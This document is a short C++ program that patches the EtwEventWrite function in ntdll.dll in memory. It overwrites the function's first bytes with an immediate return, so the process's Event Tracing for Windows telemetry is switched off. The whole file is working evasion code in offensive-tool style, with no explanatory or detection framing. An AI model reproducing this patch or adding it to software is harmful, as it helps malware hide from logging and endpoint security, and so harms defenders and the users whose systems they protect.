#include <windows.h>
#include <iostream>

BOOL PatchETW(LPCSTR function) {
    BYTE hook[] = {0x33, 0xC0, 0xC3};  // XOR EAX,EAX; RET
    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (hModule == NULL) {
        std::cerr << "[!] GetModuleHandleA Failed" << std::endl;
        return FALSE;
    }
    FARPROC address = GetProcAddress(hModule, function);
    if (address == NULL) {
        std::cerr << "[!] GetProcAddress Failed" << std::endl;
        return FALSE;
    }
    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)address, sizeof(hook), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << "[!] VirtualProtect Failed" << std::endl;
        return FALSE;
    }
    memcpy((LPVOID)address, hook, sizeof(hook));
    if (!VirtualProtect((LPVOID)address, sizeof(hook), oldProtect, &oldProtect)) {
        std::cerr << "[!] VirtualProtect Restore Failed" << std::endl;
        return FALSE;
    }
    std::cout << "[+] Patch ETW Finished!" << std::endl;
    return TRUE;
}

int main() {
    const char* etwevenwrite = "EtwEventWrite";

    if (!PatchETW(etwevenwrite)) {
        std::cerr << "[!] Patching ETW failed" << std::endl;
    }

    return 0;
}
